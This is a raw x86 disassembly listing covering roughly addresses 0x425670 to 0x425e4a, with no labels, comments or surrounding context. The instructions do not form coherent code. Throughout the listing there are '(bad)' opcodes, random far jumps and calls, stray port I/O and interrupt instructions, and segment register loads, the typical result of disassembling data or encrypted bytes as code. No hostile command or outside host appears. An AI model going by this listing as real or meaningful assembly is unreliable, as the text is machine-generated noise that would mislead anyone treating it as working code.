  425670:	sub    dl,bl
  425672:	sti    
  425673:	fild   WORD PTR [ecx+0x51]
  425676:	mov    ah,0x0
  425678:	mov    al,ds:0xa167d384
  42567d:	xor    eax,0xb710324
  425682:	dec    edi
  425683:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425684:	add    al,0xb
  425686:	inc    edi
  425687:	jmp    0x974f:0xb4e93612
  42568e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42568f:	stos   BYTE PTR es:[edi],al
  425690:	dec    eax
  425691:	test   BYTE PTR [ebp+eiz*8+0xe],bh
  425695:	mov    edx,DWORD PTR [eax+0x6d720c91]
  42569b:	mov    esp,0x47590799
  4256a0:	sub    dh,al
  4256a2:	adc    al,0x81
  4256a4:	in     al,0xd1
  4256a6:	lea    ebp,[esi+0x7a]
  4256a9:	retf   0x3c5a
  4256ac:	xchg   cl,dl
  4256ae:	fild   WORD PTR [eax]
	...
  4256b8:	add    BYTE PTR [eax],al
  4256ba:	mov    esi,0x74ef74ea
  4256bf:	(bad)  
  4256c0:	mov    edi,0x93a446fb
  4256c5:	nop
  4256c6:	and    eax,0x96a231e4
  4256cb:	into   
  4256cc:	add    DWORD PTR [eax],eax
  4256ce:	std    
  4256cf:	add    DWORD PTR [eax],eax
  4256d1:	add    BYTE PTR [edx],bl
  4256d3:	addr16 jl 0x425661
  4256d6:	adc    BYTE PTR [ecx],bl
  4256d8:	xchg   ecx,eax
  4256d9:	jge    0x42572b
  4256db:	rcr    BYTE PTR [edi+0x38],0x63
  4256df:	aaa    
  4256e0:	mov    ds:0xe4cad6e,al
  4256e5:	push   ds
  4256e6:	jno    0x425757
  4256e8:	sbb    ah,BYTE PTR [esi-0x79]
  4256eb:	push   ebx
  4256ec:	push   edx
  4256ed:	pop    ebp
  4256ee:	push   cs
  4256ef:	add    al,0xb5
  4256f1:	(bad)  
  4256f2:	cld    
  4256f3:	pop    ebx
  4256f4:	test   BYTE PTR [edx+0x4d],dl
  4256f7:	inc    ebp
  4256f8:	adc    al,0xee
  4256fa:	mov    al,ds:0xdbd727d1
  4256ff:	cs fs int 0x75
  425703:	mov    ebp,0x6b658f4
  425708:	xchg   edx,eax
  425709:	cli    
  42570a:	ret    0x31cf
  42570d:	xchg   ecx,eax
  42570e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42570f:	je     0x4256ca
  425711:	mov    esp,0xd592166a
  425716:	cli    
  425717:	and    eax,0x56427fdf
  42571c:	(bad)  
  42571e:	shl    BYTE PTR [edi+0x3],1
  425721:	call   0xf8c6:0xc4cf656f
  425728:	xor    ah,BYTE PTR [eax+0x4d]
  42572b:	fstp   TBYTE PTR [ebx-0x4523e3e1]
  425731:	or     DWORD PTR [ebx],eax
  425733:	into   
  425734:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425735:	pop    ebp
  425736:	pop    ebp
  425737:	shl    DWORD PTR [ebp+0x69],cl
  42573a:	dec    ebx
  42573b:	sub    dl,BYTE PTR [esi+0x3fdfb91b]
  425741:	ret    0x13a4
  425744:	lods   eax,DWORD PTR ds:[esi]
  425746:	adc    BYTE PTR [edx+ebx*4],bh
  425749:	push   ecx
  42574a:	add    eax,DWORD PTR [ecx+edi*8]
  42574d:	mov    al,0xed
  42574f:	sub    edx,edx
  425751:	mov    fs,esi
  425753:	push   cs
  425754:	cmp    DWORD PTR [eax],0x5bd0dc2
  42575a:	rcl    bh,1
  42575c:	add    BYTE PTR [edi+0xa],0x1b
  425760:	inc    ebx
  425761:	add    BYTE PTR [edi],al
  425763:	xor    al,0x83
  425765:	jg     0x425786
  425767:	je     0x425775
  425769:	icebp  
  42576a:	adc    DWORD PTR [edi+0x28],ecx
  42576d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42576e:	adc    eax,0x7421959
  425773:	ror    DWORD PTR [ebx+edx*8+0x22963d0d],1
  42577a:	pop    ebp
  42577b:	adc    edi,esp
  42577d:	rcl    DWORD PTR [eax],0xa2
  425780:	and    BYTE PTR [ecx+0x6c],dl
  425783:	dec    ecx
  425784:	dec    ebp
  425785:	lock or eax,0x60fba333
  42578b:	cs mov eax,0x1878d7f5
  425791:	aam    0x1d
  425793:	push   ebp
  425794:	scas   eax,DWORD PTR es:[edi]
  425795:	sbb    ebp,DWORD PTR [ebx-0x7f]
  425798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425799:	enter  0xc30a,0x26
  42579d:	rcr    WORD PTR [ebx],cl
  4257a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257a1:	adc    ah,BYTE PTR [eax-0x14b70224]
  4257a7:	int3   
  4257a8:	sbb    eax,0x1230914f
  4257ad:	pop    DWORD PTR [ebx]
  4257af:	sahf   
  4257b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257b1:	mov    al,ds:0x508bee9f
  4257b6:	aad    0x88
  4257b8:	mov    WORD PTR [eax-0x2a745565],?
  4257be:	inc    edx
  4257bf:	jge    0x425833
  4257c1:	xor    BYTE PTR [esi+edi*1-0x765f98],ah
  4257c8:	mov    dl,0xd8
  4257ca:	mov    cl,0x45
  4257cc:	xchg   ebp,eax
  4257cd:	inc    ebp
  4257ce:	cmp    BYTE PTR cs:[ebx-0x565ccc22],ah
  4257d5:	aaa    
  4257d6:	ss out dx,eax
  4257d8:	jmp    0x425854
  4257da:	mov    esp,0xcd49716c
  4257df:	sahf   
  4257e0:	cdq    
  4257e1:	mul    DWORD PTR [edi-0x7f]
  4257e4:	dec    eax
  4257e5:	jmp    0xd82c:0xde4f6385
  4257ec:	sar    BYTE PTR [edi+0x6],1
  4257ef:	dec    edx
  4257f0:	adc    ebp,ebp
  4257f2:	jbe    0x42585d
  4257f4:	out    dx,eax
  4257f5:	stos   BYTE PTR es:[edi],al
  4257f6:	adc    eax,DWORD PTR [ebx+0x29]
  4257f9:	cmp    eax,0xf99e1c21
  4257fe:	mov    bh,BYTE PTR [eax+0x115c0a96]
  425804:	cmc    
  425805:	and    eax,0x29c833bc
  42580a:	ja     0x4257cc
  42580c:	sti    
  42580d:	jae    0x425852
  42580f:	mov    bl,0x2c
  425811:	mov    ecx,ecx
  425813:	xor    DWORD PTR [edx],edi
  425815:	cli    
  425816:	pop    edx
  425817:	shl    BYTE PTR [ecx+0x28458236],1
  42581d:	pop    es
  42581e:	retf   0x6a5c
  425821:	add    BYTE PTR [eax+0x57586cf7],0xe5
  425828:	push   0xbeb366ea
  42582d:	fistp  WORD PTR [ebp+0x13]
  425830:	pop    esp
  425831:	sbb    eax,0x72155a5c
  425836:	shl    edi,0xfa
  425839:	pushf  
  42583a:	leave  
  42583b:	push   ebp
  42583c:	mov    edx,0x2edf84ac
  425841:	and    eax,0x47221465
  425846:	add    eax,0x8ec698d5
  42584b:	ret    0xfa36
  42584e:	jb     0x4257dd
  425850:	jno    0x42581d
  425852:	and    eax,0xcc7a759
  425857:	xor    edi,esp
  425859:	jecxz  0x4258d0
  42585b:	xchg   ebp,eax
  42585c:	and    eax,0xa46e06a1
  425861:	or     DWORD PTR [esi+0x5d1f21f3],ebx
  425867:	jg     0x425849
  425869:	mov    ss,ecx
  42586b:	mov    BYTE PTR [edx],dl
  42586d:	out    dx,eax
  42586e:	sub    DWORD PTR [edi],eax
  425870:	sbb    edx,ecx
  425872:	fstp   TBYTE PTR ss:[edx+0x4b5a1bf8]
  425879:	(bad)  
  42587a:	fcmovu st,st(1)
  42587c:	in     eax,dx
  42587d:	dec    edx
  42587e:	icebp  
  42587f:	xor    eax,0x8cdc7fa
  425885:	into   
  425886:	sar    BYTE PTR [eax-0x2c10a662],1
  42588c:	nop
  42588d:	mov    ss,WORD PTR [ecx-0x9]
  425890:	test   BYTE PTR [ecx],ch
  425892:	in     eax,dx
  425893:	cli    
  425894:	xchg   esi,eax
  425895:	adc    cl,ah
  425897:	pop    ebx
  425898:	jp     0x4258df
  42589a:	cmp    eax,0xc89b628b
  42589f:	or     ch,BYTE PTR [ebp+0x15ce4581]
  4258a5:	cmp    edx,eax
  4258a7:	aas    
  4258a8:	dec    edx
  4258a9:	jl     0x42582c
  4258ab:	shr    DWORD PTR fs:[esi],0xcb
  4258af:	mov    bl,0xf7
  4258b1:	mov    al,ds:0x409a2ae5
  4258b6:	and    ebp,DWORD PTR [eax+edx*4]
  4258b9:	stos   BYTE PTR es:[edi],al
  4258ba:	xchg   ebx,eax
  4258bb:	fst    QWORD PTR [ecx]
  4258bd:	retf   0x3b6d
  4258c0:	clc    
  4258c1:	pop    edi
  4258c2:	call   0x7622399f
  4258c7:	mov    edi,0xa610d5a7
  4258cc:	pop    esp
  4258cd:	xor    eax,0xfe
	...
  4258da:	dec    ebx
  4258db:	inc    ebp
  4258dc:	mov    edx,0x5fffbeee
  4258e1:	in     eax,0xe9
  4258e3:	dec    esi
  4258e4:	cmp    ch,ah
  4258e6:	jg     0x4258dd
  4258e8:	call   0x212ec42
  4258ed:	add    ch,bh
  4258ef:	add    DWORD PTR [eax],eax
  4258f1:	add    BYTE PTR [edx+eiz*4-0xe50c77a],cl
  4258f8:	dec    edi
  4258f9:	jae    0x42595c
  4258fb:	pop    edi
  4258fc:	mov    ebp,0x88f2522
  425901:	(bad)  
  425902:	pushf  
  425903:	inc    ebx
  425904:	or     ebp,edx
  425906:	lea    esi,[ebp-0x4edf5948]
  42590c:	sbb    cl,dl
  42590e:	inc    ebx
  42590f:	enter  0xa6da,0x22
  425913:	mov    ds,WORD PTR [edi-0x56]
  425916:	cli    
  425917:	test   eax,0x24238525
  42591c:	inc    BYTE PTR [eax-0x3e605ffb]
  425922:	jns    0x42591c
  425924:	push   ebx
  425925:	mov    bh,0xa1
  425927:	es lahf 
  425929:	mov    al,ds:0x35ae1fc5
  42592e:	xchg   edi,eax
  42592f:	cmp    edx,0x439efe7c
  425935:	jmp    0x42592b
  425937:	dec    ecx
  425938:	loope  0x4258e7
  42593a:	add    BYTE PTR ds:0xa14311b5,bl
  425940:	jb     0x42594c
  425942:	dec    esp
  425943:	xor    al,0x9f
  425945:	push   edi
  425946:	dec    ecx
  425947:	jnp    0x4258f0
  425949:	mov    cl,0xce
  42594b:	cs in  eax,dx
  42594d:	out    0xc4,eax
  42594f:	push   edx
  425950:	in     al,dx
  425951:	jp     0x42594d
  425953:	outs   dx,DWORD PTR fs:[esi]
  425955:	test   al,0xfe
  425957:	mov    ah,0x17
  425959:	adc    DWORD PTR [edx+0x60],esi
  42595c:	imul   esi,ebx,0x70
  42595f:	fcomp  DWORD PTR [edi-0x3fc7bfa3]
  425965:	in     eax,dx
  425966:	xchg   esi,eax
  425967:	xor    DWORD PTR [edi+0x42],eax
  42596a:	cmp    bh,BYTE PTR [ecx+0x3a]
  42596d:	inc    ecx
  42596e:	mov    ah,al
  425970:	div    ebx
  425972:	clc    
  425973:	jle    0x425956
  425975:	sbb    bh,BYTE PTR [edx]
  425977:	sar    DWORD PTR [edx-0x1a],0x83
  42597b:	inc    ecx
  42597c:	jno    0x42593b
  42597e:	mov    eax,0x9d47b6b6
  425983:	or     al,0x29
  425985:	pop    edi
  425986:	hlt    
  425987:	jg     0x4259c4
  425989:	push   0xabb3ed99
  42598e:	fcomp  QWORD PTR [ecx-0x5ad54fad]
  425994:	mov    dh,0x66
  425996:	jmp    0x4259fb
  425998:	dec    esi
  425999:	rol    BYTE PTR [edx-0xa],cl
  42599c:	jp     0x425988
  42599e:	push   eax
  42599f:	push   es
  4259a0:	call   0x5fed2ee5
  4259a5:	(bad)  
  4259a6:	push   ecx
  4259a7:	out    0x98,eax
  4259a9:	rcl    BYTE PTR [eax-0x33e5d9f9],cl
  4259af:	sti    
  4259b0:	outs   dx,BYTE PTR ds:[esi]
  4259b1:	xor    ch,BYTE PTR ss:[esi+0x4b]
  4259b5:	jge    0x425a07
  4259b7:	not    DWORD PTR [ecx-0x2a]
  4259ba:	jge    0x4259e9
  4259bc:	cdq    
  4259bd:	outs   dx,DWORD PTR ds:[esi]
  4259be:	sahf   
  4259bf:	push   eax
  4259c0:	adc    BYTE PTR [edi+0x39],0xda
  4259c4:	sbb    esi,DWORD PTR [ecx]
  4259c6:	add    bh,al
  4259c8:	stc    
  4259c9:	pop    eax
  4259ca:	dec    esi
  4259cb:	sbb    eax,0x3495ce9f
  4259d0:	popa   
  4259d1:	repz scas al,BYTE PTR es:[edi]
  4259d3:	retf   0xd37e
  4259d6:	or     dh,BYTE PTR [edx+0x65]
  4259d9:	push   es
  4259da:	(bad)  
  4259db:	xchg   esp,eax
  4259dc:	retf   
  4259dd:	retf   0x48bc
  4259e0:	aam    0x16
  4259e2:	hlt    
  4259e3:	(bad)  
  4259e5:	mov    eax,0xf8b06cf2
  4259ea:	jb     0x425a1f
  4259ec:	sbb    DWORD PTR [ebx+0x4e],ecx
  4259ef:	sbb    DWORD PTR [eax],0x6f185c6e
  4259f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259f6:	mov    al,0x80
  4259f8:	and    eax,ecx
  4259fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259fb:	mov    cl,BYTE PTR [ebp+0x28]
  4259fe:	sbb    cl,BYTE PTR [edi+0x40]
  425a01:	xor    bh,al
  425a03:	xchg   ebp,eax
  425a04:	adc    eax,0x4d0d6bfe
  425a09:	mov    ss,WORD PTR [edi-0x24]
  425a0c:	les    edi,FWORD PTR [edi]
  425a0e:	popf   
  425a0f:	pop    ss
  425a10:	and    al,0xe6
  425a12:	xor    eax,0x861a026e
  425a17:	ror    bh,cl
  425a19:	sar    DWORD PTR [esi+0x65361686],cl
  425a1f:	and    ah,BYTE PTR [esi+0x4f50d05c]
  425a25:	les    esi,FWORD PTR [ecx+0x345829f7]
  425a2b:	stc    
  425a2c:	dec    ebp
  425a2d:	adc    edi,DWORD PTR [edx-0x3d2327f7]
  425a33:	(bad)  
  425a34:	ds mov ah,dl
  425a37:	arpl   WORD PTR [ebp-0x3e],dx
  425a3a:	stos   BYTE PTR es:[edi],al
  425a3b:	sub    ebx,ecx
  425a3d:	jecxz  0x4259e5
  425a3f:	push   ecx
  425a40:	jnp    0x425a69
  425a42:	loopne 0x425a78
  425a44:	sbb    DWORD PTR [esi-0x7fd7a12c],esi
  425a4a:	adc    DWORD PTR [eax],esi
  425a4c:	inc    ebx
  425a4d:	mov    DWORD PTR ss:[esi+0x13],esi
  425a51:	fs in  eax,0x80
  425a54:	out    0x3e,eax
  425a56:	xlat   BYTE PTR ds:[ebx]
  425a57:	js     0x425abb
  425a59:	xchg   esp,eax
  425a5a:	sub    al,0xeb
  425a5c:	jmp    0x425a32
  425a5e:	xor    dh,ah
  425a60:	sub    cl,dl
  425a62:	or     eax,0x1dde342a
  425a67:	out    0xda,al
  425a69:	push   0xffffffe1
  425a6b:	dec    esp
  425a6c:	test   DWORD PTR [edi-0x53e52124],esi
  425a72:	test   DWORD PTR [edi-0x4b],0x455f2f0a
  425a79:	(bad)  
  425a7a:	mov    ebx,0xf558366d
  425a7f:	push   edi
  425a80:	adc    DWORD PTR [ebx],esi
  425a82:	fcomip st,st(5)
  425a84:	dec    esp
  425a85:	jge    0x425abe
  425a87:	sbb    DWORD PTR [esi],ecx
  425a89:	inc    esi
  425a8a:	retf   0xd2ee
  425a8d:	in     al,dx
  425a8e:	ds loop 0x425ac4
  425a91:	scas   al,BYTE PTR es:[edi]
  425a92:	add    DWORD PTR [edx],0x61
  425a95:	fcom   QWORD PTR [esi+0x6b27072]
  425a9b:	sbb    eax,eax
  425a9d:	out    0xa3,eax
  425a9f:	or     al,0xfb
  425aa1:	bound  ebx,QWORD PTR [eax+0x258b5f00]
  425aa7:	push   cs
  425aa8:	jb     0x425a8c
  425aaa:	addr16 dec eax
  425aac:	(bad)  
  425aad:	int3   
  425aae:	xlat   BYTE PTR ds:[ebx]
  425aaf:	sbb    eax,edi
  425ab1:	sub    BYTE PTR [eax],ch
  425ab3:	retf   0x565c
  425ab6:	iret   
  425ab7:	cmp    al,0xf8
  425ab9:	dec    edx
  425aba:	pop    esp
  425abc:	fnstenv [ebx-0x4b]
  425abf:	into   
  425ac0:	xchg   edi,eax
  425ac1:	pop    ecx
  425ac2:	pop    ds
  425ac3:	mov    bl,0xaf
  425ac5:	loopne 0x425a6c
  425ac7:	adc    eax,0xf09a0ffa
  425acc:	mov    cl,0xd9
  425ace:	pop    ss
  425acf:	xlat   BYTE PTR ds:[ebx]
  425ad0:	ror    DWORD PTR [edx+0x13],0x5
  425ad4:	dec    esi
  425ad5:	stc    
  425ad6:	(bad)  
  425ad7:	jge    0x425b02
  425ad9:	fptan  
  425adb:	and    ebp,edi
  425add:	mov    eax,0xb4b350a5
  425ae2:	int3   
  425ae3:	es out 0x84,al
  425ae6:	les    edi,FWORD PTR [esi]
  425ae8:	inc    ecx
  425ae9:	push   esp
  425aea:	jmp    0xfb30d1a4
	...
  425af7:	add    BYTE PTR [eax],al
  425af9:	add    BYTE PTR [edx-0x5b61f90],ch
  425aff:	fldcw  WORD PTR [ebx+0x2d6367f3]
  425b05:	(bad)  
  425b06:	gs es jae 0x425b06
  425b0a:	nop
  425b0b:	rol    BYTE PTR [ecx],cl
  425b0d:	add    ch,bh
  425b0f:	add    DWORD PTR [eax],eax
  425b11:	add    BYTE PTR [esi+0x5f],ch
  425b14:	test   eax,0x79cf33e
  425b19:	(bad)  
  425b1a:	pop    ax
  425b1c:	sti    
  425b1d:	dec    ebx
  425b1e:	cmp    ch,dl
  425b20:	mov    esp,esp
  425b22:	popa   
  425b23:	push   cs
  425b24:	cmp    al,0xf5
  425b26:	push   0xe28a8267
  425b2b:	sbb    ecx,ecx
  425b2d:	out    0xe0,eax
  425b2f:	jnp    0x425b6c
  425b31:	xchg   esp,eax
  425b32:	mov    al,ds:0xee2e9ca7
  425b37:	sub    BYTE PTR [ebp-0x2c],0xe1
  425b3b:	inc    esp
  425b3c:	add    ebp,edi
  425b3e:	dec    edi
  425b3f:	sub    bh,al
  425b41:	sub    ch,BYTE PTR [ebx]
  425b43:	add    eax,0x7d8fc24a
  425b48:	outs   dx,BYTE PTR ds:[esi]
  425b49:	adc    bl,BYTE PTR [eax]
  425b4b:	(bad)  
  425b4c:	or     ecx,DWORD PTR [esi-0x2c8da353]
  425b52:	jg     0x425bc8
  425b54:	pop    ecx
  425b55:	inc    ebp
  425b56:	mov    BYTE PTR [edx+0x2e],0x5e
  425b5a:	popf   
  425b5b:	push   ebx
  425b5c:	sub    DWORD PTR [ebp+0xf886a18],0xffffffa5
  425b63:	xor    eax,eax
  425b65:	sub    eax,0x22358a71
  425b6a:	jge    0x425bde
  425b6c:	ins    BYTE PTR es:[edi],dx
  425b6d:	or     DWORD PTR [eax],esi
  425b6f:	jo     0x425beb
  425b71:	outs   dx,DWORD PTR ds:[esi]
  425b72:	ss sub al,0xeb
  425b75:	popa   
  425b76:	(bad)  
  425b77:	inc    esi
  425b78:	div    BYTE PTR [edi-0x4fd15db2]
  425b7e:	pushf  
  425b7f:	ins    DWORD PTR es:[di],dx
  425b81:	fcomp  QWORD PTR [edi+esi*8+0x2b]
  425b85:	cld    
  425b86:	xor    DWORD PTR [ebx+0xc],0x3c
  425b8a:	inc    edi
  425b8b:	sbb    al,0xa
  425b8d:	add    edx,eax
  425b8f:	mov    ebp,0xe3a41028
  425b94:	shl    BYTE PTR [ebx-0x3b],1
  425b97:	dec    eax
  425b98:	mov    ch,0x16
  425b9a:	inc    edx
  425b9b:	xor    al,bl
  425b9d:	sahf   
  425b9e:	cmp    DWORD PTR ds:0xd11e8d8,ebp
  425ba4:	js     0x425c02
  425ba6:	mov    ecx,0xf6577f6f
  425bab:	lahf   
  425bac:	inc    esp
  425bad:	lds    eax,FWORD PTR [edi]
  425baf:	add    BYTE PTR [ebp+0x1689d1bf],0x72
  425bb6:	add    eax,0x815ff8a2
  425bbb:	jne    0x425c1a
  425bbd:	xor    al,0x14
  425bbf:	mov    esi,0x864a2374
  425bc4:	adc    eax,0xd9579948
  425bc9:	and    DWORD PTR [ebx],esi
  425bcb:	dec    edx
  425bcc:	dec    edx
  425bcd:	adc    DWORD PTR [edi+0x67bdeae1],edi
  425bd3:	aaa    
  425bd4:	jl     0x425b9f
  425bd6:	cmp    esp,DWORD PTR [ebx+0x462cb35e]
  425bdc:	daa    
  425bdd:	dec    edx
  425bde:	call   0xc22d16c
  425be3:	pushf  
  425be4:	jp     0x425b80
  425be6:	test   al,0x7a
  425be8:	sti    
  425be9:	sar    BYTE PTR [edi+eiz*1-0x5c],1
  425bed:	xchg   esp,eax
  425bee:	call   0xc1e6:0x8941dad7
  425bf5:	or     al,0x23
  425bf7:	mov    ecx,0xbb3435e1
  425bfc:	hlt    
  425bfd:	mov    edi,0xc2e032e4
  425c02:	sti    
  425c03:	or     ah,BYTE PTR [edi+0x6]
  425c06:	adc    al,0x9
  425c08:	pop    edx
  425c09:	jle    0x425bbe
  425c0b:	(bad)  
  425c0c:	repnz xor bl,BYTE PTR [edx+ebx*1-0x5a485051]
  425c14:	dec    eax
  425c15:	mov    eax,ds:0xe192c60e
  425c1a:	pop    ecx
  425c1b:	mov    BYTE PTR [ebp+0x7e],bl
  425c1e:	and    esi,DWORD PTR [edx-0x7d]
  425c21:	jo     0x425c66
  425c23:	out    0xd0,eax
  425c25:	mov    WORD PTR [edi-0x43],fs
  425c28:	sbb    eax,edi
  425c2a:	sub    al,0x3a
  425c2c:	push   0xa9765f52
  425c31:	ins    BYTE PTR es:[edi],dx
  425c32:	dec    BYTE PTR [esi]
  425c34:	and    eax,0xacf73a4a
  425c39:	dec    eax
  425c3a:	jp     0x425cb2
  425c3c:	push   0xffffffc3
  425c3e:	sahf   
  425c3f:	xor    DWORD PTR [edx+0x4a],esp
  425c42:	std    
  425c43:	pop    ss
  425c44:	mov    bl,0x8d
  425c46:	and    ch,BYTE PTR [edx]
  425c48:	and    BYTE PTR [ebp+edx*2-0x46],ch
  425c4c:	inc    esp
  425c4d:	(bad)  
  425c4e:	(bad)  
  425c4f:	aas    
  425c50:	or     al,0xd6
  425c52:	mov    eax,ds:0xd683d8f7
  425c57:	jb     0x425c7a
  425c59:	push   ebx
  425c5a:	push   esi
  425c5b:	mov    ah,0x7c
  425c5d:	jns    0x425bf9
  425c5f:	sbb    bh,BYTE PTR [ebp+0x7df43fe7]
  425c65:	arpl   WORD PTR [ebp+0x3],cx
  425c68:	inc    esp
  425c69:	les    esi,FWORD PTR [ebx+0x15540823]
  425c6f:	mov    ds:0x987bd439,eax
  425c74:	(bad)  
  425c75:	into   
  425c76:	xchg   edx,eax
  425c77:	pop    edx
  425c78:	xchg   DWORD PTR [ecx+0x40c2adf],esp
  425c7e:	cwde   
  425c7f:	mov    ss,WORD PTR [esi-0x1]
  425c82:	pop    eax
  425c83:	jnp    0x425cce
  425c85:	cdq    
  425c86:	aad    0x54
  425c88:	mov    dh,BYTE PTR [edi+0x23d6278b]
  425c8e:	inc    edx
  425c8f:	int    0xcd
  425c91:	mov    ah,0xc9
  425c93:	add    DWORD PTR [edx],0x22
  425c96:	stc    
  425c97:	aad    0x19
  425c99:	ss xchg ebx,eax
  425c9b:	call   0xf32243f6
  425ca0:	(bad)  
  425ca1:	daa    
  425ca2:	pushf  
  425ca3:	pop    esp
  425ca4:	call   0xbe0bc3bb
  425ca9:	cmp    BYTE PTR [eax],al
  425cab:	push   ebp
  425cac:	xor    DWORD PTR ds:0x21a2b48,esi
  425cb2:	pop    edi
  425cb3:	jbe    0x425cd2
  425cb5:	jle    0x425c68
  425cb7:	pop    ss
  425cb8:	test   DWORD PTR [ecx-0x46e964b0],ebp
  425cbe:	mov    dl,0x6f
  425cc0:	xchg   ebp,eax
  425cc1:	lods   eax,DWORD PTR ds:[esi]
  425cc2:	test   BYTE PTR [esi+0x51],bl
  425cc5:	test   BYTE PTR [ecx-0x61ec9360],cl
  425ccb:	and    ah,BYTE PTR [edx]
  425ccd:	dec    ebx
  425cce:	jo     0x425d02
  425cd0:	xchg   BYTE PTR [eax+0x17],cl
  425cd3:	adc    ebx,edx
  425cd5:	arpl   WORD PTR [ebx-0x56],sp
  425cd8:	push   es
  425cd9:	shr    BYTE PTR [edx],1
  425cdb:	fld    QWORD PTR [eax]
  425cdd:	lahf   
  425cde:	dec    eax
  425cdf:	mov    ?,WORD PTR [ecx-0x30f43e56]
  425ce5:	push   ecx
  425ce6:	dec    edx
  425ce7:	les    ecx,FWORD PTR [ecx-0x52]
  425cea:	xor    ebx,DWORD PTR [edi]
  425cec:	lea    ebp,ds:0x4f8b4a32
  425cf2:	shl    BYTE PTR [ebx],cl
  425cf4:	lds    ebx,FWORD PTR [eax-0x17569c8d]
  425cfa:	push   edx
  425cfb:	inc    edi
  425cfc:	inc    ebx
  425cfd:	jae    0x425cd6
  425cff:	inc    esi
  425d00:	or     ecx,edx
  425d02:	add    bh,bl
  425d04:	pop    ss
  425d05:	push   eax
  425d06:	stos   BYTE PTR es:[edi],al
  425d07:	push   0xffffffb7
  425d09:	ins    BYTE PTR es:[edi],dx
  425d0a:	or     al,0x87
  425d0c:	mov    ah,0x9d
  425d0e:	inc    esi
	...
  425d17:	add    BYTE PTR [eax],al
  425d19:	add    BYTE PTR [edx-0x79],cl
  425d1c:	push   edx
  425d1d:	dec    esp
  425d1e:	(bad)  
  425d20:	pop    esi
  425d21:	xchg   DWORD PTR [edi+0x746d210f],ecx
  425d27:	xor    BYTE PTR [esi+0x1d48df9],dh
  425d2d:	add    ch,bh
  425d2f:	add    DWORD PTR [eax],eax
  425d31:	add    BYTE PTR [ebx],cl
  425d33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d34:	sar    BYTE PTR [edx],1
  425d36:	(bad)
  425d39:	jp     0x425d19
  425d3b:	imul   edi,DWORD PTR [esi+0x7a],0x59
  425d3f:	inc    ecx
  425d40:	mov    esp,edi
  425d42:	je     0x425ceb
  425d44:	or     al,0xa6
  425d46:	shl    BYTE PTR [ebx-0x6346be81],cl
  425d4c:	loopne 0x425db9
  425d4e:	mov    bh,0xfc
  425d50:	mov    ah,0xb3
  425d52:	(bad)  
  425d53:	stc    
  425d54:	mov    dh,0x94
  425d56:	mov    dl,0x84
  425d58:	aaa    
  425d59:	or     esp,0x72f33df4
  425d5f:	jno    0x425d5e
  425d61:	ficomp DWORD PTR [ecx-0x7f6de770]
  425d67:	inc    eax
  425d68:	sub    ecx,DWORD PTR [eax+0x146e2d93]
  425d6e:	pop    ebp
  425d6f:	fwait
  425d70:	pop    ebp
  425d71:	xor    dl,BYTE PTR [edx+eax*8]
  425d74:	fidivr DWORD PTR [edi-0x45]
  425d77:	cmp    eax,0xf510bb05
  425d7c:	xor    esp,ebp
  425d7e:	arpl   WORD PTR [ebx-0x46],si
  425d81:	mov    ds:0xf0fda330,al
  425d86:	push   0x67
  425d88:	les    ecx,FWORD PTR [esi+0x6246ecb]
  425d8e:	jl     0x425d97
  425d90:	lock mov bh,0xa3
  425d93:	jb     0x425d78
  425d95:	mov    esi,0xfd218609
  425d9a:	inc    ebx
  425d9b:	jmp    0x1d65:0xd3038a5
  425da2:	ins    BYTE PTR es:[edi],dx
  425da3:	sub    al,0xcb
  425da5:	sar    DWORD PTR [ecx+0x45],1
  425da8:	adc    BYTE PTR [edi],dl
  425daa:	xor    DWORD PTR [ecx+0x1a7c0a3f],edi
  425db0:	xchg   ebx,eax
  425db1:	arpl   WORD PTR [edi+0x42],cx
  425db4:	and    al,0xc2
  425db6:	rol    al,cl
  425db8:	pop    ecx
  425db9:	div    DWORD PTR [ebp+0xd2a0394]
  425dbf:	stc    
  425dc0:	push   eax
  425dc1:	rol    bh,cl
  425dc3:	scas   al,BYTE PTR es:[edi]
  425dc4:	hlt    
  425dc5:	ss shl dl,0xaf
  425dc9:	adc    dh,BYTE PTR [edi+0x28776e79]
  425dcf:	push   0xffffff8a
  425dd1:	sub    BYTE PTR [ebp+ecx*1+0x4fe0328],0xea
  425dd9:	xchg   edx,eax
  425dda:	in     al,dx
  425ddb:	dec    esi
  425ddc:	pop    ebp
  425ddd:	mov    WORD PTR [ecx-0x645bb081],cs
  425de3:	sub    DWORD PTR [edx-0x66],ecx
  425de6:	test   BYTE PTR [ecx-0x50b89e31],ch
  425dec:	jmp    0x425dd0
  425dee:	jp     0x425e45
  425df0:	push   edi
  425df1:	je     0x425d81
  425df3:	sbb    al,0x60
  425df5:	dec    eax
  425df6:	sbb    DWORD PTR [edi+0x795fa877],0xfffffff9
  425dfd:	fwait
  425dfe:	dec    ebx
  425dff:	rol    BYTE PTR [eax+0x4b817133],0x1b
  425e06:	sub    esp,DWORD PTR [edx+0x161bad6e]
  425e0c:	fwait
  425e0d:	adc    eax,DWORD PTR [eax+ecx*8+0x48]
  425e11:	fisub  DWORD PTR [esi]
  425e13:	mov    edx,0x91ef8084
  425e18:	and    al,0x78
  425e1a:	cmp    al,0x3a
  425e1c:	push   ecx
  425e1d:	test   ecx,esi
  425e1f:	adc    DWORD PTR [eax-0xf],ebx
  425e22:	and    cl,BYTE PTR [ebx-0x78]
  425e25:	inc    esi
  425e26:	or     bl,BYTE PTR [edi-0x80]
  425e29:	leave  
  425e2a:	cld    
  425e2b:	push   eax
  425e2c:	jo     0x425e3c
  425e2e:	dec    esi
  425e2f:	rcr    cl,1
  425e31:	nop
  425e32:	js     0x425ea3
  425e34:	frstor es:[eax-0x32]
  425e38:	cwde   
  425e39:	dec    cx
  425e3b:	push   ss
  425e3c:	jg     0x425dc8
  425e3e:	mov    ebx,0xc5654db2
  425e43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e44:	inc    edx
  425e45:	sub    eax,0x25623627
  425e4a:	dec    edi
